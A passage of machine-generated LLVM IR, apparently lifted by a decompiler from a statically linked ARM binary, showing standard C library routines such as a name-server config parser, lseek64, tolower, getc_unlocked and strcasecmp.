  br i1 %v2_1b7dc, label %dec_label_pc_1b80c, label %dec_label_pc_1b85c

dec_label_pc_1b7e8:                               ; preds = %dec_label_pc_1b7fc
  %v0_1b7e8 = load i32, i32* @r4, align 4
  %v4_1b7e8 = mul i32 %v1_1b7e8, 4
  %v5_1b7e8 = add i32 %v0_1b7e8, %v4_1b7e8
  %v6_1b7e8 = inttoptr i32 %v5_1b7e8 to i32*
  %v7_1b7e8 = load i32, i32* %v6_1b7e8, align 4
  store i32 %v7_1b7e8, i32* %r1.global-to-local, align 4
  %v3_1b7ec = call i32 @__GI_strcasecmp(i8* %v2_1b7d8, i32 %v7_1b7e8)
  store i32 %v3_1b7ec, i32* %r0.global-to-local, align 4
  %v2_1b7f0 = icmp eq i32 %v3_1b7ec, 0
  %v0_1b7f4 = load i32, i32* @r5, align 4
  %v1_1b7f4 = add i32 %v0_1b7f4, 1
  store i32 %v1_1b7f4, i32* @r5, align 4
  br i1 %v2_1b7f0, label %dec_label_pc_1b80c, label %dec_label_pc_1b7fc

dec_label_pc_1b7fc:                               ; preds = %dec_label_pc_1b7fc.preheader, %dec_label_pc_1b7e8
  %v1_1b7e8 = phi i32 [ 1, %dec_label_pc_1b7fc.preheader ], [ %v1_1b7f4, %dec_label_pc_1b7e8 ]
  %v1_1b7fc = load i32, i32* @r6, align 4
  store i32 %v0_1b594, i32* %r0.global-to-local, align 4
  %v5_1b804 = icmp slt i32 %v1_1b7e8, %v1_1b7fc
  br i1 %v5_1b804, label %dec_label_pc_1b7e8, label %dec_label_pc_1b85c

dec_label_pc_1b80c:                               ; preds = %dec_label_pc_1b7e8, %dec_label_pc_1b7d0
  store i32 %v0_1b58c, i32* %r1.global-to-local, align 4
  br i1 %v7_1b810, label %dec_label_pc_1b818, label %dec_label_pc_1b834

dec_label_pc_1b818:                               ; preds = %dec_label_pc_1b80c
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_1b81c = load i32, i32* @r7, align 4
  store i32 %v0_1b81c, i32* %r2.global-to-local, align 4
  %v0_1b820 = load i32, i32* @r4, align 4
  %v1_1b820 = inttoptr i32 %v0_1b820 to i32*
  %v2_1b820 = load i32, i32* %v1_1b820, align 4
  store i32 %v2_1b820, i32* %r1.global-to-local, align 4
  %v3_1b824 = inttoptr i32 %v2_1b820 to i8*
  %v4_1b824 = call i32 @inet_pton(i32 2, i8* %v3_1b824, i32 %v0_1b81c)
  store i32 %v4_1b824, i32* %r0.global-to-local, align 4
  %v5_1b82c = icmp sgt i32 %v4_1b824, 0
  br i1 %v5_1b82c, label %dec_label_pc_1b668, label %dec_label_pc_1b858

dec_label_pc_1b834:                               ; preds = %dec_label_pc_1b80c
  store i32 %v0_1b58c, i32* %r2.global-to-local, align 4
  br i1 %v7_1b838, label %dec_label_pc_1b840, label %dec_label_pc_1b858

dec_label_pc_1b840:                               ; preds = %dec_label_pc_1b834
  store i32 10, i32* %r0.global-to-local, align 4
  %v0_1b844 = load i32, i32* @r4, align 4
  %v1_1b844 = inttoptr i32 %v0_1b844 to i32*
  %v2_1b844 = load i32, i32* %v1_1b844, align 4
  store i32 %v2_1b844, i32* %r1.global-to-local, align 4
  store i32 %v0_1b710, i32* %r2.global-to-local, align 4
  %v3_1b84c = inttoptr i32 %v2_1b844 to i8*
  %v4_1b84c = call i32 @inet_pton(i32 10, i8* %v3_1b84c, i32 %v0_1b710)
  store i32 %v4_1b84c, i32* %r0.global-to-local, align 4
  %v5_1b854 = icmp sgt i32 %v4_1b84c, 0
  br i1 %v5_1b854, label %dec_label_pc_1b6ac, label %dec_label_pc_1b858

dec_label_pc_1b858:                               ; preds = %dec_label_pc_1b818, %dec_label_pc_1b834, %dec_label_pc_1b840
  store i32 2, i32* @sl, align 4
  br label %dec_label_pc_1b85c

dec_label_pc_1b85c:                               ; preds = %dec_label_pc_1b7fc, %dec_label_pc_1b7d0, %dec_label_pc_1b7a8, %dec_label_pc_1b858, %dec_label_pc_1b704
  %v0_1b85c = load i32, i32* @fp, align 4
  store i32 %v0_1b85c, i32* %r0.global-to-local, align 4
  %v0_1b860 = load i32, i32* @r8, align 4
  store i32 %v0_1b860, i32* %r1.global-to-local, align 4
  store i32 %stack_var_-52.0, i32* %r2.global-to-local, align 4
  %v3_1b868 = call i32 @fgets(i32 %v0_1b85c, i32 %v0_1b860, i32 %stack_var_-52.0)
  store i32 %v3_1b868, i32* %r0.global-to-local, align 4
  %v2_1b86c = icmp eq i32 %v3_1b868, 0
  br i1 %v2_1b86c, label %dec_label_pc_1b874, label %dec_label_pc_1b71c

dec_label_pc_1b874:                               ; preds = %dec_label_pc_1b85c, %dec_label_pc_1b6ac, %dec_label_pc_1b668
  %v2_1b874 = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_1b874, i32* %r3.global-to-local, align 4
  %v7_1b878 = icmp eq i32 %v2_1b874, 1
  br i1 %v7_1b878, label %dec_label_pc_1b890, label %dec_label_pc_1b880

dec_label_pc_1b880:                               ; preds = %dec_label_pc_1b874
  store i32 %stack_var_-52.0, i32* %r0.global-to-local, align 4
  %v1_1b884 = inttoptr i32 %stack_var_-52.0 to i8*
  %v2_1b884 = call i32 @__GI_fclose(i8* %v1_1b884)
  store i32 %v2_1b884, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1b890

dec_label_pc_1b88c:                               ; preds = %dec_label_pc_1b5a8, %bb74, %dec_label_pc_1b5fc, %dec_label_pc_1b5f4, %dec_label_pc_1b5e8, %dec_label_pc_1b5d4, %dec_label_pc_1b5b8
  store i32 34, i32* @sl, align 4
  br label %dec_label_pc_1b890

dec_label_pc_1b890:                               ; preds = %dec_label_pc_1b7b8, %dec_label_pc_1b874, %dec_label_pc_1b880, %dec_label_pc_1b650, %dec_label_pc_1b88c
  %v0_1b890 = load i32, i32* @sl, align 4
  store i32 %v0_1b890, i32* %r0.global-to-local, align 4
  store i32 %v3_1b578, i32* @r4, align 4
  store i32 %v6_1b578, i32* @r5, align 4
  store i32 %v12_1b578, i32* @r7, align 4
  store i32 %v15_1b578, i32* @r8, align 4
  store i32 %v21_1b578, i32* @sl, align 4
  store i32 %v24_1b578, i32* @fp, align 4
  ret i32 %v0_1b890

; uselistorder directives
  uselistorder i32 %v1_1b7e8, { 1, 0 }
  uselistorder i32 %v0_1b7ac, { 1, 0 }
  uselistorder i32 %v3_1b74823, { 1, 0 }
  uselistorder i32 %v0_1b74820, { 1, 0 }
  uselistorder i32 %v2_1b724, { 1, 0, 2 }
  uselistorder i32 %stack_var_-52.0, { 1, 0, 3, 2 }
  uselistorder i32 %stack_var_-40.1, { 1, 0 }
  uselistorder i32 %v0_1b624, { 1, 0 }
  uselistorder i32 %v0_1b5e8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1b5cc, { 1, 0 }
  uselistorder i32 %v0_1b598, { 1, 0, 2 }
  uselistorder i32 %v0_1b58c, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1b588, { 4, 2, 3, 1, 0 }
  uselistorder i32 %tmp61, { 1, 0, 3, 2 }
  uselistorder i32 %tmp57, { 0, 2, 3, 1 }
  uselistorder i32 %tmp56, { 3, 0, 1, 2 }
  uselistorder i32 %tmp53, { 0, 4, 3, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 1, 11, 17, 12, 13, 14, 15, 16, 0, 18, 19, 2, 3, 4, 5, 6, 7, 8, 9, 10, 20, 21, 22, 23, 24 }
  uselistorder i32* %r2.global-to-local, { 16, 4, 5, 9, 10, 13, 11, 12, 14, 15, 0, 1, 2, 3, 6, 7, 8, 17, 19, 18, 20 }
  uselistorder i32* %r1.global-to-local, { 13, 4, 7, 8, 9, 1, 10, 0, 11, 12, 2, 3, 5, 6, 14 }
  uselistorder i32* %r0.global-to-local, { 0, 5, 1, 22, 21, 11, 6, 13, 12, 14, 15, 18, 16, 17, 20, 19, 2, 3, 4, 7, 8, 9, 10, 23, 25, 24 }
  uselistorder i32* %ip.global-to-local, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 34, { 6, 2, 3, 0, 8, 9, 7, 1, 4, 5 }
  uselistorder i32 (i32, i32, i32)* @fgets, { 2, 1, 0 }
  uselistorder i32 (i8*, i32)* @__GI_strcoll, { 21, 22, 23, 24, 0, 1, 25, 26, 27, 28, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20 }
  uselistorder i32 7, { 2, 18, 19, 8, 9, 10, 0, 21, 20, 1, 3, 4, 14, 5, 6, 15, 11, 12, 13, 7, 16, 17 }
  uselistorder i32* @global_var_2b254, { 0, 6, 2, 7, 1, 3, 4, 8, 5, 9 }
  uselistorder i32 35, { 0, 3, 4, 2, 1 }
  uselistorder i32 10, { 3, 4, 39, 5, 6, 40, 41, 42, 43, 44, 32, 16, 31, 7, 45, 1, 46, 47, 48, 49, 12, 17, 50, 18, 51, 19, 20, 21, 0, 33, 34, 22, 30, 52, 9, 24, 23, 35, 36, 11, 15, 14, 10, 13, 2, 37, 38, 25, 8, 27, 28, 26, 29, 53 }
  uselistorder i32 80, { 0, 1, 3, 4, 5, 6, 2 }
  uselistorder i32 48, { 11, 5, 12, 1, 0, 13, 14, 2, 15, 16, 17, 3, 6, 18, 7, 19, 20, 10, 8, 9, 4 }
  uselistorder i32 56, { 4, 5, 6, 7, 8, 9, 10, 2, 0, 3, 1 }
  uselistorder i32 44, { 12, 13, 14, 15, 16, 17, 20, 1, 19, 18, 0, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32 -48, { 2, 3, 0, 4, 5, 6, 7, 1 }
  uselistorder i32* @fp, { 62, 65, 63, 1, 64, 66, 67, 68, 69, 0, 71, 70, 72, 73, 74, 2, 87, 88, 89, 90, 91, 92, 93, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 119, 118, 113, 114, 115, 116, 117 }
  uselistorder i32* @sl, { 8, 9, 10, 11, 14, 12, 13, 15, 16, 17, 18, 19, 20, 21, 2, 3, 22, 23, 0, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 39, 40, 41, 42, 43, 44, 45, 1, 46, 47, 48, 49, 50, 4, 5, 6, 7 }
  uselistorder i32* @r7, { 29, 31, 32, 30, 33, 34, 35, 36, 37, 38, 9, 10, 11, 12, 13, 14, 15, 1, 39, 3, 40, 41, 42, 43, 44, 45, 46, 48, 47, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 97, 16, 17, 2, 18, 6, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 66, 67, 68, 69, 4, 5, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 0, 7, 8, 81, 82, 95, 96, 25, 26, 27, 28, 19, 20, 21, 22, 23, 24 }
  uselistorder label %dec_label_pc_1b890, { 4, 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1b88c, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_1b85c, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_1b858, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1b7fc, { 1, 0 }
  uselistorder label %dec_label_pc_1b7a8, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1b748.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_1b788, { 1, 0 }
  uselistorder label %dec_label_pc_1b704, { 1, 0 }
  uselistorder label %bb74, { 1, 0 }
  uselistorder label %dec_label_pc_1b5b8, { 1, 0 }
}

define i32 @__libc_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_1b8e4, label %dec_label_pc_1b8d0

dec_label_pc_1b8d0:                               ; preds = %entry
  %v0_1b8d0 = call i32 @__errno_location()
  %v0_1b8d4 = load i32, i32* %r4.global-to-local, align 4
  %v1_1b8d4 = sub i32 0, %v0_1b8d4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_1b8dc = inttoptr i32 %v0_1b8d0 to i32*
  store i32 %v1_1b8d4, i32* %v2_1b8dc, align 4
  %v0_1b8ec.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1b8ec

dec_label_pc_1b8e4:                               ; preds = %entry
  %v2_1b8e4 = icmp eq i32 %arg1, 0
  br i1 %v2_1b8e4, label %dec_label_pc_1b8f8, label %dec_label_pc_1b8ec

dec_label_pc_1b8ec:                               ; preds = %dec_label_pc_1b8e4, %dec_label_pc_1b8d0
  %v0_1b8ec = phi i32 [ %arg1, %dec_label_pc_1b8e4 ], [ %v0_1b8ec.pre, %dec_label_pc_1b8d0 ]
  br label %dec_label_pc_1b8fc

dec_label_pc_1b8f8:                               ; preds = %dec_label_pc_1b8e4
  br label %dec_label_pc_1b8fc

dec_label_pc_1b8fc:                               ; preds = %dec_label_pc_1b8ec, %dec_label_pc_1b8f8
  %v14_1b900 = phi i32 [ %v0_1b8ec, %dec_label_pc_1b8ec ], [ %tmp9, %dec_label_pc_1b8f8 ]
  ret i32 %v14_1b900

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_1b8fc, { 1, 0 }
}

define i32 @__GI_tolower(i32 %arg1) local_unnamed_addr {
entry:
  %v1_1b90c = icmp slt i32 %arg1, 0
  br i1 %v1_1b90c, label %bb, label %bb1

bb:                                               ; preds = %entry
  ret i32 %arg1

bb1:                                              ; preds = %entry
  %v2_1b90c = mul i32 %arg1, 2
  %v2_1b918 = load i32, i32* bitcast (i32** @global_var_2b590.1381 to i32*), align 4
  %v2_1b91c = add i32 %v2_1b918, %v2_1b90c
  %v3_1b920 = inttoptr i32 %v2_1b91c to i8*
  %v4_1b920 = load i8, i8* %v3_1b920, align 1
  %v6_1b920 = zext i8 %v4_1b920 to i32
  %v1_1b924 = add i32 %v2_1b91c, 1
  %v2_1b924 = inttoptr i32 %v1_1b924 to i8*
  %v3_1b924 = load i8, i8* %v2_1b924, align 1
  %v4_1b924 = zext i8 %v3_1b924 to i32
  %v3_1b928 = mul nuw i32 %v4_1b924, 16777216
  %v4_1b92c = sdiv i32 %v3_1b928, 65536
  %v5_1b92c = or i32 %v4_1b92c, %v6_1b920
  ret i32 %v5_1b92c

; uselistorder directives
  uselistorder i32 %v2_1b91c, { 1, 0 }
}

define i32 @getc_unlocked(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-9 = alloca i8, align 1
  %stack_var_-8 = alloca i32, align 4
  %v3_1b938 = load i32, i32* @r4, align 4
  store i32 %v3_1b938, i32* %stack_var_-8, align 4
  %v0_1b93c = load i32, i32* @r0, align 4
  %v1_1b93c = add i32 %v0_1b93c, 16
  %v2_1b93c = inttoptr i32 %v1_1b93c to i32*
  %v3_1b93c = load i32, i32* %v2_1b93c, align 4
  store i32 %v3_1b93c, i32* %r2.global-to-local, align 4
  %v1_1b940 = add i32 %v0_1b93c, 24
  %v2_1b940 = inttoptr i32 %v1_1b940 to i32*
  %v3_1b940 = load i32, i32* %v2_1b940, align 4
  %v3_1b944 = icmp ult i32 %v3_1b93c, %v3_1b940
  store i32 %v0_1b93c, i32* @r4, align 4
  br i1 %v3_1b944, label %bb, label %dec_label_pc_1b95c

bb:                                               ; preds = %entry
  %v2_1b94c = inttoptr i32 %v3_1b93c to i8*
  %v3_1b94c = load i8, i8* %v2_1b94c, align 1
  %v4_1b94c = zext i8 %v3_1b94c to i32
  store i32 %v4_1b94c, i32* %r0.global-to-local, align 4
  %v6_1b94c = add i32 %v3_1b93c, 1
  store i32 %v6_1b94c, i32* %r2.global-to-local, align 4
  store i32 %v6_1b94c, i32* %v2_1b93c, align 4
  br label %dec_label_pc_1ba5c

dec_label_pc_1b95c:                               ; preds = %entry
  %v1_1b95c = inttoptr i32 %v0_1b93c to i8*
  %v2_1b95c = load i8, i8* %v1_1b95c, align 1
  %v3_1b95c = zext i8 %v2_1b95c to i32
  %v1_1b960 = and i32 %v3_1b95c, 131
  %tmp22 = icmp ugt i32 %v1_1b960, 128
  br i1 %tmp22, label %dec_label_pc_1b97c, label %dec_label_pc_1b96c

dec_label_pc_1b96c:                               ; preds = %dec_label_pc_1b95c
  store i32 128, i32* @r1, align 4
  %v0_1b970 = call i32 @__stdio_trans2r_o()
  store i32 %v0_1b970, i32* %r0.global-to-local, align 4
  %v2_1b974 = icmp eq i32 %v0_1b970, 0
  br i1 %v2_1b974, label %dec_label_pc_1b96c.dec_label_pc_1b97c_crit_edge, label %dec_label_pc_1ba58

dec_label_pc_1b96c.dec_label_pc_1b97c_crit_edge:  ; preds = %dec_label_pc_1b96c
  %v0_1b97c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1b97c

dec_label_pc_1b97c:                               ; preds = %dec_label_pc_1b96c.dec_label_pc_1b97c_crit_edge, %dec_label_pc_1b95c
  %v2_1b9c8 = phi i32 [ %v0_1b97c.pre, %dec_label_pc_1b96c.dec_label_pc_1b97c_crit_edge ], [ %v0_1b93c, %dec_label_pc_1b95c ]
  %v1_1b97c = inttoptr i32 %v2_1b9c8 to i8*
  %v2_1b97c = load i8, i8* %v1_1b97c, align 1
  %v3_1b97c = zext i8 %v2_1b97c to i32
  store i32 %v3_1b97c, i32* %r2.global-to-local, align 4
  %v1_1b980 = add i32 %v2_1b9c8, 1
  %v2_1b980 = inttoptr i32 %v1_1b980 to i8*
  %v3_1b980 = load i8, i8* %v2_1b980, align 1
  %v4_1b980 = zext i8 %v3_1b980 to i32
  %v4_1b984 = mul nuw nsw i32 %v4_1b980, 256
  %v5_1b984 = or i32 %v4_1b984, %v3_1b97c
  store i32 %v5_1b984, i32* %r2.global-to-local, align 4
  %v1_1b988 = and i32 %v3_1b97c, 2
  %v2_1b988 = icmp eq i32 %v1_1b988, 0
  br i1 %v2_1b988, label %dec_label_pc_1b9b8, label %dec_label_pc_1b990

dec_label_pc_1b990:                               ; preds = %dec_label_pc_1b97c
  %tmp23 = urem i8 %v2_1b97c, 2
  %v1_1b990 = zext i8 %tmp23 to i32
  %tmp18 = sub nsw i32 0, %v1_1b990
  %v4_1b994 = and i32 %tmp18, 4
  %v5_1b994 = add i32 %v4_1b994, %v2_1b9c8
  %v1_1b998 = add i32 %v5_1b994, 36
  %v2_1b998 = inttoptr i32 %v1_1b998 to i8*
  %v3_1b998 = load i8, i8* %v2_1b998, align 1
  %v4_1b998 = zext i8 %v3_1b998 to i32
  %v1_1b99c = add nsw i32 %v5_1b984, -1
  store i32 %v1_1b99c, i32* %r2.global-to-local, align 4
  %v3_1b9a0 = sdiv i32 %v1_1b99c, 256
  store i32 %v3_1b9a0, i32* %r1.global-to-local, align 4
  store i32 %v4_1b998, i32* %r0.global-to-local, align 4
  %v2_1b9ac = add i32 %v2_1b9c8, 40
  %v3_1b9ac = inttoptr i32 %v2_1b9ac to i32*
  store i32 0, i32* %v3_1b9ac, align 4
  %v0_1b9b0 = load i32, i32* %r1.global-to-local, align 4
  %v1_1b9b0 = trunc i32 %v0_1b9b0 to i8
  %v2_1b9b0 = load i32, i32* @r4, align 4
  %v3_1b9b0 = add i32 %v2_1b9b0, 1
  %v4_1b9b0 = inttoptr i32 %v3_1b9b0 to i8*
  store i8 %v1_1b9b0, i8* %v4_1b9b0, align 1
  br label %dec_label_pc_1b9ec

dec_label_pc_1b9b8:                               ; preds = %dec_label_pc_1b97c
  %v1_1b9b8 = add i32 %v2_1b9c8, 16
  store i32 %v1_1b9b8, i32* %r1.global-to-local, align 4
  %v1_1b9bc = inttoptr i32 %v1_1b9b8 to i32*
  %v2_1b9bc = load i32, i32* %v1_1b9bc, align 4
  store i32 %v2_1b9bc, i32* %r1.global-to-local, align 4
  %v3_1b9bc = add i32 %v2_1b9c8, 20
  %v4_1b9bc = inttoptr i32 %v3_1b9bc to i32*
  %v5_1b9bc = load i32, i32* %v4_1b9bc, align 4
  %v9_1b9c0 = icmp eq i32 %v5_1b9bc, %v2_1b9bc
  br i1 %v9_1b9c0, label %dec_label_pc_1b9d0, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_1b9b8
  %v2_1b9c4 = inttoptr i32 %v2_1b9bc to i8*
  %v3_1b9c4 = load i8, i8* %v2_1b9c4, align 1
  %v4_1b9c4 = zext i8 %v3_1b9c4 to i32
  store i32 %v4_1b9c4, i32* %r0.global-to-local, align 4
  %v6_1b9c4 = add i32 %v2_1b9bc, 1
  store i32 %v6_1b9c4, i32* %r1.global-to-local, align 4
  store i32 %v6_1b9c4, i32* %v1_1b9bc, align 4
  br label %dec_label_pc_1ba5c

dec_label_pc_1b9d0:                               ; preds = %dec_label_pc_1b9b8
  %v1_1b9d0 = add i32 %v2_1b9c8, 4
  %v2_1b9d0 = inttoptr i32 %v1_1b9d0 to i32*
  %v3_1b9d0 = load i32, i32* %v2_1b9d0, align 4
  %v4_1b9d8 = icmp eq i32 %v3_1b9d0, -2
  br i1 %v4_1b9d8, label %dec_label_pc_1b9dc, label %dec_label_pc_1b9f4

dec_label_pc_1b9dc:                               ; preds = %dec_label_pc_1b9d0
  %v1_1b9dc = or i32 %v5_1b984, 4
  store i32 %v1_1b9dc, i32* %r2.global-to-local, align 4
  store i8 %v3_1b980, i8* %v2_1b980, align 1
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1b9ec

dec_label_pc_1b9ec:                               ; preds = %dec_label_pc_1b990, %dec_label_pc_1b9dc
  %v0_1b9ec = load i32, i32* %r2.global-to-local, align 4
  %v1_1b9ec = trunc i32 %v0_1b9ec to i8
  %v2_1b9ec = load i32, i32* @r4, align 4
  %v3_1b9ec = inttoptr i32 %v2_1b9ec to i8*
  store i8 %v1_1b9ec, i8* %v3_1b9ec, align 1
  br label %dec_label_pc_1ba5c

dec_label_pc_1b9f4:                               ; preds = %dec_label_pc_1b9d0
  %v1_1b9f4 = and i32 %v4_1b984, 768
  %v2_1b9f4 = icmp eq i32 %v1_1b9f4, 0
  br i1 %v2_1b9f4, label %bb20, label %bb19

bb19:                                             ; preds = %dec_label_pc_1b9f4
  store i32 ptrtoint (i32** @global_var_2b274.1329 to i32), i32* %r0.global-to-local, align 4
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_1b9f4, %bb19
  store i32 113152, i32* @lr, align 4
  %v1_1b9fc = xor i1 %v2_1b9f4, true
  call void @__pseudo_cond_branch(i1 %v1_1b9fc, i32 ptrtoint (i32* @global_var_1a73c.1684 to i32))
  %v0_1ba00 = load i32, i32* @r4, align 4
  %v1_1ba00 = add i32 %v0_1ba00, 8
  store i32 %v1_1ba00, i32* %r2.global-to-local, align 4
  %v1_1ba04 = inttoptr i32 %v1_1ba00 to i32*
  %v2_1ba04 = load i32, i32* %v1_1ba04, align 4
  store i32 %v2_1ba04, i32* %r2.global-to-local, align 4
  %v3_1ba04 = add i32 %v0_1ba00, 12
  %v4_1ba04 = inttoptr i32 %v3_1ba04 to i32*
  %v5_1ba04 = load i32, i32* %v4_1ba04, align 4
  %v9_1ba08 = icmp eq i32 %v5_1ba04, %v2_1ba04
  br i1 %v9_1ba08, label %dec_label_pc_1ba3c, label %dec_label_pc_1ba10

dec_label_pc_1ba10:                               ; preds = %bb20
  %v2_1ba10 = add i32 %v0_1ba00, 24
  %v3_1ba10 = inttoptr i32 %v2_1ba10 to i32*
  store i32 %v2_1ba04, i32* %v3_1ba10, align 4
  %v0_1ba14 = load i32, i32* @r4, align 4
  store i32 %v0_1ba14, i32* %r0.global-to-local, align 4
  %v2_1ba18 = call i32 @__stdio_rfill(i32 %v0_1ba14)
  store i32 %v2_1ba18, i32* %r0.global-to-local, align 4
  %v2_1ba1c = icmp eq i32 %v2_1ba18, 0
  br i1 %v2_1ba1c, label %dec_label_pc_1ba58, label %dec_label_pc_1ba24

dec_label_pc_1ba24:                               ; preds = %dec_label_pc_1ba10
  %v0_1ba24 = load i32, i32* @r4, align 4
  %v1_1ba24 = add i32 %v0_1ba24, 20
  %v2_1ba24 = inttoptr i32 %v1_1ba24 to i32*
  %v3_1ba24 = load i32, i32* %v2_1ba24, align 4
  %v2_1ba28 = add i32 %v0_1ba24, 24
  %v3_1ba28 = inttoptr i32 %v2_1ba28 to i32*
  store i32 %v3_1ba24, i32* %v3_1ba28, align 4
  %v0_1ba2c = load i32, i32* @r4, align 4
  %v1_1ba2c = add i32 %v0_1ba2c, 16
  %v2_1ba2c = inttoptr i32 %v1_1ba2c to i32*
  %v3_1ba2c = load i32, i32* %v2_1ba2c, align 4
  %v1_1ba30 = inttoptr i32 %v3_1ba2c to i8*
  %v2_1ba30 = load i8, i8* %v1_1ba30, align 1
  %v3_1ba30 = zext i8 %v2_1ba30 to i32
  store i32 %v3_1ba30, i32* %r0.global-to-local, align 4
  %v5_1ba30 = add i32 %v3_1ba2c, 1
  store i32 %v5_1ba30, i32* %v2_1ba2c, align 4
  br label %dec_label_pc_1ba5c

dec_label_pc_1ba3c:                               ; preds = %bb20
  %v1_1ba3c = inttoptr i32 %v0_1ba00 to i8*
  store i32 %v0_1ba00, i32* %r0.global-to-local, align 4
  %v2_1ba40 = ptrtoint i8* %stack_var_-9 to i32
  store i32 %v2_1ba40, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_1ba48 = call i32 @__stdio_READ(i8* %v1_1ba3c, i32 %v2_1ba40, i32 1)
  store i32 %v5_1ba48, i32* %r0.global-to-local, align 4
  %v2_1ba4c = icmp eq i32 %v5_1ba48, 0
  br i1 %v2_1ba4c, label %dec_label_pc_1ba58, label %bb21

bb21:                                             ; preds = %dec_label_pc_1ba3c
  %v4_1ba50 = load i8, i8* %stack_var_-9, align 1
  %v5_1ba50 = sext i8 %v4_1ba50 to i32
  store i32 %v5_1ba50, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1ba5c

dec_label_pc_1ba58:                               ; preds = %dec_label_pc_1ba3c, %dec_label_pc_1b96c, %dec_label_pc_1ba10
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1ba5c

dec_label_pc_1ba5c:                               ; preds = %bb, %bb21, %.thread4, %dec_label_pc_1ba24, %dec_label_pc_1b9ec, %dec_label_pc_1ba58
  %v2_1ba60 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1ba60, i32* @r4, align 4
  %v8_1ba60 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v8_1ba60

; uselistorder directives
  uselistorder i32 %v2_1b9bc, { 1, 0, 2, 3 }
  uselistorder i32 %v3_1b97c, { 1, 0, 2 }
  uselistorder i32 %v2_1b9c8, { 1, 3, 2, 4, 0, 6, 5 }
  uselistorder i32 %v3_1b93c, { 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-9, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 4, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 11, 0, 1, 4, 2, 3, 10, 5, 6, 7, 8, 9, 13, 12 }
  uselistorder i8** @global_var_2b2ac.1313, { 1, 0, 2 }
  uselistorder i32** @global_var_2b274.1329, { 0, 2, 1 }
  uselistorder i32 40, { 5, 6, 7, 8, 9, 1, 2, 0, 10, 11, 12, 13, 14, 3, 4 }
  uselistorder i32 36, { 8, 9, 10, 11, 12, 13, 14, 15, 4, 1, 0, 16, 17, 18, 2, 3, 5, 7, 6 }
  uselistorder i8 2, { 0, 1, 2, 3, 4, 7, 5, 6, 10, 8, 11, 9, 13, 12 }
  uselistorder i32 131, { 1, 0 }
  uselistorder i32 24, { 20, 21, 22, 23, 24, 25, 26, 27, 29, 30, 0, 31, 9, 18, 10, 1, 32, 33, 34, 35, 36, 37, 11, 28, 12, 13, 14, 15, 16, 17, 6, 7, 5, 8, 2, 3, 4, 19 }
  uselistorder label %dec_label_pc_1ba5c, { 5, 1, 3, 4, 2, 0 }
  uselistorder label %dec_label_pc_1ba58, { 0, 2, 1 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %dec_label_pc_1b9ec, { 1, 0 }
}

define i32 @__GI_strcasecmp(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @lr, align 4
  br label %dec_label_pc_1ba78

dec_label_pc_1ba78:                               ; preds = %bb8, %entry
  %v8_1badc3 = phi i32 [ %v8_1badc, %bb8 ], [ 0, %entry ]
  %v0_1bad0 = phi i32 [ %v1_1bad0, %bb8 ], [ %arg2, %entry ]
  %v0_1bad4 = phi i32 [ %v1_1bad4, %bb8 ], [ %tmp, %entry ]
  %v9_1ba78 = icmp eq i32 %v0_1bad4, %v0_1bad0
